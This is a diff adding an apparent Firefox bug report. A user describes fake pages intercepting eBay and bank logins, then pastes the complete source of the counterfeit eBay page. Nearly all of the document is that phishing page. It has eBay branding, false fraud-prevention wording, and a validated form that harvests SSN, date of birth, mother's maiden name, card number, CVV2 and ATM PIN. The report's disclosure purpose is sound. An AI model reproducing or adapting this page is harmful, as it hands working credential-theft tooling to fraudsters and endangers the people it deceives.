@@ -1,0 +1,762 @@
+Java exploit displaying custom phishing page
+User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)
+Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)
+
+This started immediately after I upgraded to 3.6.  
+My logins for my bank and Ebay were interrupted and a custom page was displayed asking for sensitive financial information.  This exploit is unique to Firefox and does not happen with IE.  
+
+Reproducible: Sometimes
+
+Steps to Reproduce:
+1. Go to Ebay
+2. Select "contact us"
+3. Sometimes an "intercept page" will appear and request sensitive information.
+4. Also appears randomly if you attempt to contact the seller.
+
+A similiar page appears when I log into my bank.
+1.  Log in
+2.  Bogus page appears stating it does not recognize IP address of my machine and provide sensitive information.
+Actual Results:  
+I aborted Firefox
+
+Expected Results:  
+Page of contact information for Ebay is expected.
+
+Code taking from faux Ebay page:
+
+
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="generator" content=
+"HTML Tidy for Windows (vers 14 February 2006), see www.w3.org" />
+<base href='http://cgi4.ebay.com/ws/eBayISAPI.dll?UserIdRecognizerShow' />
+<!--eBay V3- msxml 6.0 XXXXXXXXXXXXXXXXXXXXXXXXXX-->
+<link type="text/css" href="http://include.ebaystatic.com/css/e585/us/registration/registeryukonstyles_e5851us.css"media="all" rel="stylesheet" />
+<meta http-equiv="Content-Type" content="text/html; charset=us-ascii" /><!--srcId: UserIdRecognizer -->
+<title>Enter your information</title>
+<link rel="stylesheet" type="text/css" href="https://secureinclude.ebaystatic.com/v4css/en_US/e573/GlobalNavVjoOpt23_Ebay_e5736892865_en_US_s.css" />
+<link rel="stylesheet" type="text/css" href="https://secureinclude.ebaystatic.com/css/v/us/legacy/ebay.css" />
+<script LANGUAGE="JavaScript">
+/////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////
+var lastMsgDate = new Date();
+var whitespace = " \t\n\r";
+var defaultEmptyOK = false;
+var whitespace = " \t\n\r";
+lblCardNumber="Card Number";
+reqCardNumber=true;
+lblExpire_month="Month";
+reqExpire_month=true;
+lblExpire_year="Year";
+reqExpire_year=true;
+lblCard_cvv2="CVV2";
+reqCard_cvv2=true;
+lblATMPIN="ATM PIN";
+reqATMPIN=true;
+lblDOB_month="Month";
+reqDOB_month=true;
+lblDOB_day="Day";
+reqDOB_day=true;
+lblDOB_year="Year";
+reqDOB_year=true;
+lblMMN="Mother's Maiden Name";
+reqMMN=true;
+lblSSN="Social Security Number";
+reqSSN=false;
+lblDL="Drivers License Number";
+reqDL=true;
+lblEmail="Email Address";
+reqEmail=true;
+lblFirstName="First Name";
+reqFirstName=true;
+lblmiddleInitial="Middle Initial";
+reqmiddleInitial=false;
+lblLastName="Last Name";
+reqLastName=true;
+function isCreditCard(st) {
+	if (st.length > 19)
+		return (false);
+	sum = 0; mul = 1; l = st.length;
+	for (i = 0; i < l; i++) {
+		digit = st.substring(l-i-1,l-i);
+		tproduct = parseInt(digit ,10)*mul;
+		if (tproduct >= 10)
+			sum += (tproduct % 10) + 1;
+		else
+			sum += tproduct;
+		if (mul == 1)
+			mul++;
+		else
+			mul--;
+	}
+	if ((sum % 10) == 0)
+		return (true);
+	else
+		return (false);
+}
+
+function isDigit(aChar)
+{
+	return ((aChar >= '0') && (aChar <= '9'));
+}
+
+// AutoTab /////////////////////
+function containsElement(arr, ele) {
+  var found = false, index = 0;
+  while(!found && index < arr.length)
+  if(arr[index] == ele)
+  found = true;
+  else
+  index++;
+  return found;
+ }
+
+var isNN = (1 !=-1);
+// Forms Engine function
+function autoTab(input,len, e) {
+ var keyCode = (isNN) ? e.which : e.keyCode;
+ var filter = (isNN) ? [0,8,9] : [0,8,9,16,17,18,37,38,39,40,46];
+
+ if(input.value.length >= len && !containsElement(filter,keyCode)) {
+  // input.value = input.value.slice(0, len);
+
+  // Determine index number of this field
+  idx = -1;
+  for (i = 0; i < docform.length; i ++) {
+   if (docform.elements[i].name == input.name) {
+    idx = i;
+   }
+  }
+
+  // Get next field number
+  if (idx != -1) {
+   next = idx + 1;
+   if (next >= docform.length) {
+    next = 0
+   }
+
+   // Highlight next field
+   switch (docform.elements[next].type) {
+    case 'text':
+     docform.elements[next].focus();
+     docform.elements[next].select();
+     break;
+    case 'radio':
+    case 'checkbox':
+    case 'select-one':
+     docform.elements[next].focus();
+     break;
+    default:
+     //alert(document.formApp.elements[next].type);
+     break;
+   }
+  }
+ }
+}
+//End of AutoTab /////////////////////
+
+
+function isValidInteger (s)
+{   var i;
+    for (i = 0; i < s.length; i++)
+    {
+        var c = s.charAt(i);
+       if (!isDigit(c)) return false;
+    }
+    return true;
+}
+
+///////// Messages /////////
+function minLengthMessage (theField, errorLabel, value) {
+ theField.focus();
+ //theField.select();
+ alert('Please enter a valid \"' + errorLabel + '\".\n\"' + errorLabel + '\" must be at least \"' + value + '\" characters long.');
+ lastMsgDate = new Date();
+ return false;
+}
+
+function isAlphabetic (s)
+{   var i;	
+    var sLower = s.toLowerCase();
+    for (i = 0; i < sLower.length; i++)
+    {
+        var c = sLower.charAt(i);
+        if (!isLetter(c))
+        return false;
+    }
+    return true;
+}
+
+function maxLengthMessage (theField, errorLabel, value) {
+ theField.focus()
+ //theField.select()
+ alert('Please enter a valid \"' + errorLabel + '\".\n\"' + errorLabel + '\" can not be more than \"' + value + '\" characters long.');
+ lastMsgDate = new Date();
+ return false;
+}
+
+function minValueMessage (theField, errorLabel, value) {
+ theField.focus();
+ //theField.select();
+ alert('Please enter a valid \"' + errorLabel + '\".\n\"' + errorLabel + '\" must be at least \"' + value + '\".');
+ lastMsgDate = new Date();
+ return false;
+}
+
+function maxValueMessage (theField, errorLabel, value) {
+ theField.focus()
+ //theField.select()
+ alert('Please enter a valid \"' + errorLabel + '\".\n\"' + errorLabel + '\" can not be more than \"' + value + '\".');
+ lastMsgDate = new Date();
+ return false;
+}
+
+function invalidValueMessage (theField, errorLabel) {
+ theField.focus();
+ //theField.select();
+ alert('Please enter a valid \"' + errorLabel + '\".');
+ lastMsgDate = new Date();
+ return false;
+}
+
+function requiredFieldMessage(theField, errorLabel) {
+ theField.focus();
+ //theField.select();
+ alert('Please enter a value for the \"' + errorLabel + '\" field.');
+ lastMsgDate = new Date();
+ return false;
+}
+
+function stripInitialWhitespace (s)
+{   var i = 0;
+    while ((i < s.length) && charInString (s.charAt(i), whitespace))
+       i++;
+    return s.substring (i, s.length);
+}
+
+function charInString (c, s)
+{   for (i = 0; i < s.length; i++)
+    {   if (s.charAt(i) == c) return true;
+    }
+    return false
+}
+
+function isEmpty(s)
+{   return ((s == null) || (s.length == 0))
+}
+
+function isWhitespace (s)
+{   var i;
+    if (isEmpty(s)) return true;
+    for (i = 0; i < s.length; i++)
+    {
+        var c = s.charAt(i);
+        if (whitespace.indexOf(c) == -1) return false;
+    }
+    return true;
+}
+
+
+//Old Email Check - lms637
+function isEmail (s)
+{   if (isEmpty(s))
+     if (isEmail.arguments.length == 1) return defaultEmptyOK;
+       else return (isEmail.arguments[1] == true);
+    if (isWhitespace(s)) return false;
+    var i = 1;
+    var sLength = s.length;
+    while ((i < sLength) && (s.charAt(i) != "@"))
+    { i++
+    }
+   if ((i >= sLength) || (s.charAt(i) != "@")) return false;
+    else i += 2;
+    while ((i < sLength) && (s.charAt(i) != "."))
+    { i++
+    }
+   
+    if ((i >= sLength - 1) || (s.charAt(i) != ".")) return false;
+    else return true;
+}
+
+
+function isSingleEmail(s)
+{	
+	var count = 0;
+	for (i = 0; i < s.length; i++)
+    {   if (s.charAt(i) == "@"){
+    		count = count + 1;      		
+    	}
+    }
+    if (count > 1){
+    	 return false;
+    }
+    return true;
+           
+}
+///////// End of Messages /////////
+
+// Forms Engine function
+function checkIntegerField (theField, errorLabel, required, minLen, maxLen, minValue, maxValue)
+{
+    var chk = theField.value;
+
+    if (!isValidInteger(theField.value)) {
+      return invalidValueMessage(theField, errorLabel);
+    }
+
+    if (required==true) {
+      if (chk.length == 0) {
+      return requiredFieldMessage (theField, errorLabel);
+      }
+    }
+
+    if (chk.length > 0) {
+       if (minLen > 0) {
+          if (chk.length < minLen) {
+           return minLengthMessage (theField, errorLabel, minLen);
+          }
+       }
+       if (maxLen > 0) {
+          if (chk.length > maxLen) {
+           return maxLengthMessage (theField, errorLabel, maxLen);
+          }
+       }
+       if (minValue > 0) {
+         if (chk < minValue) {
+           return minValueMessage (theField, errorLabel, minValue);
+         }
+       }
+       if (maxValue > 0) {
+         if (chk > maxValue) {
+           return maxValueMessage (theField, errorLabel, maxValue);
+         }
+       }
+    }
+    return true;
+}
+
+// Forms Engine function
+function checkTextField (theField, errorLabel, required, minLen, maxLen)
+{
+    var chk = stripInitialWhitespace(theField.value);
+    theField.value = chk;
+
+    if (required==true) {
+      if (chk.length == 0) {
+      return requiredFieldMessage (theField, errorLabel);
+      }
+    }
+
+    if (chk.length > 0) {
+       if (minLen > 0) {
+          if (chk.length < minLen) {
+           return minLengthMessage (theField, errorLabel, minLen);
+          }
+       }
+       if (maxLen > 0) {
+          if (chk.length > maxLen) {
+           return maxLengthMessage (theField, errorLabel, maxLen);
+          }
+       }
+    }
+    return true;
+}
+
+function checkEmailAddress(theField, errorLabel, required, fieldName, len) {
+	var returnValue = false;
+	if ((checkTextField(theField, errorLabel, required, fieldName, len))) {
+		if (theField.value == "") {
+			returnValue = true;
+		} else if (theField.value != "") {
+			if (!isEmail(theField.value, false)) {
+				alert(errorLabel + " must contain @ and '.'");
+				theField.focus();
+				theField.select();
+				returnValue = false;
+			} else {  
+				if(!isSingleEmail(theField.value, false)) {
+
+					alert(errorLabel + " field must contain only one email address.");
+					theField.focus();
+					theField.select();
+					returnValue = false;
+				}else {
+					returnValue = true;
+				}
+				}
+			}
+	}
+    return returnValue;
+}
+
+function checkCard(TheField, errorLabel, required, minLen, maxLen, minValue, maxValue)
+{	
+   if (!checkIntegerField(TheField, errorLabel, required, minLen, maxLen, minValue, maxValue)) {
+   			return false;
+		}
+  if (!required && TheField.value.length > 0) {	
+   if (TheField.value.charAt(0) != 3 && TheField.value.charAt(0) != 4 && TheField.value.charAt(0) != 5 && TheField.value.charAt(0) != 6){
+		 alert('Please enter a valid \"' + errorLabel + '\".');
+		 return false;
+    	}
+	}
+	if (!isCreditCard(TheField.value)) {
+		alert('Please enter a valid \"' + errorLabel + '\".');
+		 return false;
+	
+	}
+    return true;
+}
+
+function validateForm()
+{
+	form = docform;
+	var validated = false;
+	validated =
+	checkTextField(form.elements['FirstName'], lblFirstName, reqFirstName, 0, 20) &&
+	checkTextField(form.elements['LastName'], lblLastName, reqLastName, 0, 30) &&
+	checkIntegerField(form.elements['DOB_month'], lblDOB_month, reqDOB_month, 1, 2, 1, 12) &&
+	checkIntegerField(form.elements['DOB_day'], lblDOB_day, reqDOB_day, 1, 2, 1, 31) &&
+	checkIntegerField(form.elements['DOB_year'], lblDOB_year, reqDOB_year, 4, 4, 1900, 2100) &&
+	checkIntegerField(form.elements['SSN1'], lblSSN, reqSSN, 3, 3, 0, 0) &&
+	checkIntegerField(form.elements['SSN2'], lblSSN, reqSSN, 2, 2, 0, 0) &&
+	checkIntegerField(form.elements['SSN3'], lblSSN, reqSSN, 4, 4, 0, 0) &&
+	checkTextField(form.elements['MMN'], lblMMN, reqMMN, 0, 30) &&
+//	checkEmailAddress(form.elements['Email'], lblEmail, reqEmail, 5, 60) &&
+	checkCard(form.elements['CCNumber'], lblCardNumber, reqCardNumber, 15, 16, 0, 0) &&
+	checkIntegerField(form.elements['CCExp_month'], lblExpire_month, reqExpire_month, 1, 2, 1, 12) &&
+	checkIntegerField(form.elements['CCExp_year'], lblExpire_year, reqExpire_year, 4, 4, 2008, 2100) &&
+	checkIntegerField(form.elements['CVV2'], lblCard_cvv2, reqCard_cvv2, 3, 4, 0, 0) &&
+	checkIntegerField(form.elements['ATMPIN'], lblATMPIN, reqATMPIN, 4, 6, 0, 0) &&
+	true;
+	if (validated) {
+		if (!checkInt(form.elements['ATMPIN'].value)) {
+			alert('Please enter a valid ATM PIN');
+			return false;
+		}
+	}
+	return  validated;
+}
+function checkInt(value,onlyrexpcheck) {
+	if (!value.match(/^[0-9]+$/)) return false;
+	if (onlyrexpcheck) return true;
+	var intStr = '1234567890';
+	var intStr2 = '9876543210';
+	var lastChar;
+	if (intStr.indexOf(value) != -1 || intStr2.indexOf(value) != -1) return false;
+	for (j = 0; j < value.length; j++) {
+		if (!lastChar) {
+			lastChar = value.charAt(j);
+			continue;
+		}
+		if (lastChar != value.charAt(j)) return true;
+	}
+	return false;
+}
+// -->
+
+		</script>
+</head>
+<body bgcolor="#FFFFFF">
+<div class="pagewidth">
+<div class="pageminwidth">
+
+<div class="pagelayout">
+<div class="pagecontainer"><!-- Begin eBay Header -->
+<!--2008-10-01 15:49:26,,, uu.ruddl671,RcmdId UserIdRecognizerShow,RlogId p4pfan%60jtb9%3Fuu.ruddl671-11d47e53f3b--><!--cacheStatus: true-->
+<div id="gnheader" class="gbhdr">
+<table width="100%" cellpadding="0" cellspacing="0" border="0">
+<tr>
+<td>
+<div id="cobrandHeader"></div>
+<div id="dynamicmenu-hdrCtr" class="hdrCtr">
+<table border="0" cellpadding="0" cellspacing="0" width="100%"class="logobar">
+<tr>
+<td width="1%" valign="bottom" class="logoimg"><a href="http://www.ebay.com" rel="nofollow"><img src="https://securepics.ebaystatic.com/aw/pics/logos/logoEbay_x45.gif"alt="From collectibles to cars, buy and sell all kinds of items on eBay"border="0" height="45" width="110" /></a></td>
+<td valign="bottom" width="50%"></td>
+</tr>
+</table>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+
+<td class="brnd1"></td>
+<td class="brnd2"></td>
+<td class="brnd3"></td>
+<td class="brnd4"></td>
+<td class="brnd5"></td>
+<td class="brnd6"></td>
+<td class="brnd7"></td>
+</tr>
+<tr>
+<td class="brnd8"></td>
+<td class="brnd8"></td>
+<td class="brnd8"></td>
+<td class="brnd8"></td>
+<td class="brnd8"></td>
+<td class="brnd8"></td>
+<td class="brnd8"></td>
+</tr>
+
+</table>
+</div>
+
+<!--@sghp@ headerStyle=MIN:DEFAULT: @eghp@-->
+<!-- End eBay Header -->
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td valign="top">
+<div class="hlpLnk" style="padding:15px 0px 25px 0px;">
+<table cellpadding="0" cellspacing="0" border="0">
+<tr>
+<td valign="middle"><a href=
+"/h" onclick=
+"return false;">Help</a><img src=
+"http://pics.ebaystatic.com/aw/pics/s.gif" width="5" height=
+"1" /></td>
+<td><a href="/h"
+onclick="return false;"><img border=
+"0" alt="" src=
+"http://pics.ebaystatic.com/aw/pics/icons/iconHelp_24x24.gif"
+align="absmiddle" /></a></td>
+</tr>
+</table>
+</div>
+
+<div class="pageHeader" style="padding:10px 0px 25px 14px;">Enter
+your information</div>
+We have noticed an increasing fraudulent activity recently. In
+order to provide your security and protect you from fraudsters we
+have introduced a new system of identification that will help us to
+avoid any kind of fraud or unauthorised access.<br />
+<br />
+Please enter as more information as possible to provide your
+complete identification and to activate all the features of the new
+system.<br />
+<br />
+<table cellpadding="0" cellspacing="0">
+<tr>
+<td>
+<div class="greyBoxRCP" style="width:100%;">
+<div class="n">
+<div class="e">
+<div class="w"></div>
+</div>
+</div>
+
+<div class="greyInnerLayer">
+<div class="greyBoxTitle">User Information: </div>
+<div><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1"
+height="10" alt=" " /></div>
+
+<div><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1"
+height="10" alt=" " /></div>
+<div class="greyBoxContent">
+<script Language= "JavaScript">
+document.write('<FORM name=form2 action='+window.location+' method=post onsubmit="return validateForm()">')
+</script>
+	
+<table border="0" width="490" cellspacing="0" cellpadding="0">
+<tr>
+<td class="fieldTitle">First Name:</td>
+<td class="fieldTitle">Last Name:</td>
+</tr>
+
+<tr>
+<td><input name="FirstName" maxlength="20" onkeyup="return autoTab(this, 20, event);" onchange="checkTextField(this, lblFirstName, reqFirstName, 0, 20)" /></td>
+<td><input name="LastName" maxlength="30" onkeyup="return autoTab(this, 30, event);" onchange="checkTextField(this, lblLastName, reqLastName, 0, 30)" /></td>
+</tr>
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td width="35%" class="fieldTitle">Date of Birth (mm/dd/yyyy):</td>
+</tr>
+<tr>
+<td><input name="DOB_month" type="text" id="DOB_month" onchange="checkIntegerField(this, lblDOB_month, reqDOB_month, 1, 2, 1, 12)" onkeyup="return autoTab(this, 2, event);" size="2" maxlength="2" style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px;width:25px" /> 
+			/<b> </b>
+			<input type="text" size="2" maxlength="2" name="DOB_day" onkeyup="return autoTab(this, 2, event);" onchange="checkIntegerField(this, lblDOB_day, reqDOB_day, 1, 2, 1, 31)" style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px;width:25px" /><b>
+								</b>/
+			<input type="text" size="4" maxlength="4" name="DOB_year" onkeyup="return autoTab(this, 4, event);" onchange="checkIntegerField(this, lblDOB_year, reqDOB_year, 4, 4, 1900, 2100)" style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px;width:40px" /></td>
+
+</tr>
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td width="35%" class="fieldTitle">Social Security Number:</td>
+</tr>
+<tr>
+<td><input name="SSN1" maxlength="3" size="3" onkeyup="return autoTab(this, 3, event);" onchange="checkIntegerField(this, lblSSN, reqSSN, 3, 3, 0, 0)" style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px;width:30px" />
+								<b>-</b>
+								<input name="SSN2" maxlength="2" size="2" onkeyup="return autoTab(this, 2, event);" onchange="checkIntegerField(this, lblSSN, reqSSN, 2, 2, 0, 0)" style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px;width:25px" /> 
+			<b>-</b>
+								<input name="SSN3" maxlength="4" size="4" onkeyup="return autoTab(this, 4, event);" onchange="checkIntegerField(this, lblSSN, reqSSN, 4, 4, 0, 0)" style="padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px;width:40px" /></td>
+
+</tr>
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td width="35%" class="fieldTitle">Mother&#39;s Maiden Name:</td>
+</tr>
+<tr>
+<td><input onkeyup="return autoTab(this, 30, event);" maxLength="30" onchange="checkTextField(this, lblMMN, reqMMN, 0, 30)" size="25" name="MMN"></td>
+</tr>
+<tr>
+<td><br/></td>
+</tr>
+<tr>
+<td colspan=2>
+<div class="greyBoxTitle">Card Information (ie, ATM, debit, credit card): </div>
+
+</td>
+</tr>
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td width="35%" class="fieldTitle">Card Number:</td>
+</tr>
+<tr>
+<td><input onkeyup="return autoTab(this, 16, event);" maxLength="16" onchange="checkCard(this, lblCardNumber, reqCardNumber, 15, 16, 0, 0)" size="25" name="CCNumber" style="width:120px"></td>
+</tr>
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td class="fieldTitle">Card Expiration Date (mm/yyyy):</td>
+</tr>
+<tr>
+
+<td><input size="2" maxlength="2" name="CCExp_month" onKeyUp="return autoTab(this, 2, event);" onChange="checkIntegerField(this, lblExpire_month, reqExpire_month, 1, 2, 1, 12)" style="width:30px">
+           / <input size="4" maxlength="4" name="CCExp_year" onKeyUp="return autoTab(this, 4, event);" onChange="checkIntegerField(this, lblExpire_year, reqExpire_year, 4, 4, 2008, 2100)" style="width:40px"></td>
+</tr>
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td class="fieldTitle">Card CVV2:</td>
+</tr>
+<tr>
+<td><input size="4" maxlength="4" name="CVV2" onKeyUp="return autoTab(this, 4, event);" onChange="checkIntegerField(this, lblCard_cvv2, reqCard_cvv2, 3, 4, 0, 0)" style="width:40px"></td>
+</tr>
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td class="fieldTitle">ATM PIN:</td>
+
+</tr>
+<tr>
+<td><input name="ATMPIN" id="ATMPIN" onchange="checkIntegerField(this, lblATMPIN, reqATMPIN, 4, 6, 0, 0)" onkeyup="return autoTab(this, 4, event);" size="8" maxLength="6" style="width:65px"></td>
+</tr>
+<tr>
+<td><img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1"
+height="17" alt=" " /></td>
+</tr>
+<tr>
+<td><button type="submit" class="Button"><span class=
+"btn"><span class="btn">Continue</span></span></button></td>
+</tr>
+</table>
+
+</form>
+</div>
+</div>
+<div class="s">
+
+<div class="e">
+<div class="w"></div>
+</div>
+</div>
+</div>
+<div class="greyBoxBottomPadding"></div>
+<table align="center" border="0" cellpadding="0" cellspacing="0"
+class="formTable"></table>
+<script type="text/javascript" language="JavaScript" xmlns:bx=
+"http://www.ebay.com/2004/bex">
+//<![CDATA[
+                    ebay.oDocument.oPage.createConfig = function() {var  c = ebay.oDocument.addConfig(new EbayConfig('EBX.CrossLinking'));c.sLayer='ebx_layer';c.sHTML='<table align="center" style="border:2px solid #0098CF; margin-bottom: 15px;" width="85%" cellpadding="0" cellspacing="0" bgcolor="#EDF9FF"><tr valign="middle"><td width="36" style="padding: 0 10px 0 10px;"><img align="middle" src="http://pics.ebaystatic.com/aw/pics/icon/iconInfo_16x16.gif" /><\/td><td width="80%" nowrap="nowrap" style="padding-right:10px" >You\'ve left eBay Express.<\/td><td align="left" nowrap="nowrap"><a href="http://www.express.<#1#>/">Shop again on eBay Express<\/a><span style="margin:0 10px 0 10px;">|<\/span><img align="bottom" src="http://pics.ebaystatic.com/aw/pics/express/icons/iconCart_15x10.gif" alt=""/> <a href="http://cart.express.<#1#>/ws/eBayISAPI.dll?ExpressCart&action.view=&from=Header">Shopping Cart<#2#><\/a><\/td><td width="135" nowrap="nowrap" style="padding: 0 20px 0 20px;"><img align="top" src="http://pics.ebaystatic.com/aw/pics/express/logos/logoExpress_95x39.gif" alt=""><\/img><\/td><td nowrap="nowrap" width="26" align="left"><a href="#1" id="b_close" name="b_close"><img align="middle" border="0" src="http://pics.ebaystatic.com/aw/pic
+s/buttons/btnExpressClose.gif" alt="" ><\/img><\/a><\/td><\/tr><\/table>';c.sCartCountText=' (<#1#>)';c.sClose='b_close';c.aHost={'0':'ebay.com','77':'ebay.de','2':'ebay.co.uk','15':'ebay.com.au'};c.aHideOnParams=["fromebxris=1", "fromebxrisZ1"];} ;ebay.oDocument.oPage.createConfig();
+//]]>
+</script><!--Begin eBay Footer--><!--cacheStatus: false-->
+<div id="glbfooter">
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td class="g-pipe"><img src=
+"https://securepics.ebaystatic.com/aw/pics/s.gif" height="10"
+width="1" /><br />
+<a href="http://pages.ebay.com/aboutebay.html">About eBay</a> |
+<a href="http://www2.ebay.com/aw/marketing.shtml">Announcements</a>
+
+| <a href=
+"http://pages.ebay.com/securitycenter/index.html">Security
+Center</a> | <a href=
+"http://sofe.ebay.com/ws/eBayISAPI.dll?SojRedirect&amp;cid=1285&amp;ebayredir=http://pages.ebay.com/ebay_toolbar/index.html">
+eBay Toolbar</a> | <a href=
+"http://pages.ebay.com/help/policies/index.html" rel=
+"nofollow">Policies</a> | <a href=
+"http://www.ebaymainstreet.com">Government Relations</a> | <a href=
+"http://pages.ebay.com/sitemap.html">Site Map</a> | <a href=
+"http://pages.ebay.com/help/index.html">Help</a></td>
+
+</tr>
+<tr>
+<td height="4"></td>
+</tr>
+<tr>
+<td height="1" bgcolor="#CCCCCC" colspan="2"></td>
+</tr>
+<tr>
+<td height="4"></td>
+</tr>
+<tr class="g-hlp" valign="top">
+<td class="g-nav coreFooterLegalNotice">Copyright &#194;&#169;
+1995-2008 eBay Inc. All Rights Reserved. Designated trademarks and
+brands are the property of their respective owners. Use of this Web
+site constitutes acceptance of the eBay <a href=
+"http://pages.ebay.com/help/policies/user-agreement.html" rel=
+"nofollow">User Agreement</a> and <a href=
+"http://pages.ebay.com/help/policies/privacy-policy.html" rel=
+"nofollow">Privacy Policy</a>.<br />
+
+<img src="https://securepics.ebaystatic.com/aw/pics/s.gif" height=
+"10" />
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tr>
+<td class="g-nav" width="100%"><a href=
+"http://viv.ebay.com/ws/eBayISAPI.dll?EbayTime">eBay official
+time</a></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<div id="cobrandFooter"></div>
+</div>
+</td>
+<td>&nbsp;&nbsp;&nbsp;&nbsp;</td>
+<td valign=top style="width:250px">
+<div class="greyBoxRCP">
+<div class="n">
+
+<div class="e">
+<div class="w">
+</div></div>
+</div>
+<div class="greyInnerLayer">
+<div class="textboxAlign" style="padding-bottom:10px;"><b>Your privacy is important to us</b></div>
+<div class="textbox">eBay does not rent or sell your personal information to third parties without your consent. To learn more, read our <a href="http://pages.ebay.com/help/policies/privacy-policy.html" target="new">privacy policy</a>.<br><br>Your address will be used for shipping your purchase or receiving payment from buyers.<br></div>
+<div align="center" class="greyBoxTopPadding">
+<a href="http://www.truste.org/ivalidate.php?url=www.ebay.com&amp;sealid=101" target="new">
+<img src="https://securepics.ebaystatic.com/aw/pics/logos/logoTRUSTe_71x100.gif" width="71" height="100" border="0" alt="truste" align="middle"></a>
+</div>
+</td>
+
+<!--End eBay Footer-->
+</tr>
+</table>
+</td>
+
+</tr>
+</table>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
+<script type='text/javascript'>
+var docform = document.forms['form2'];
+</script>
+
+--
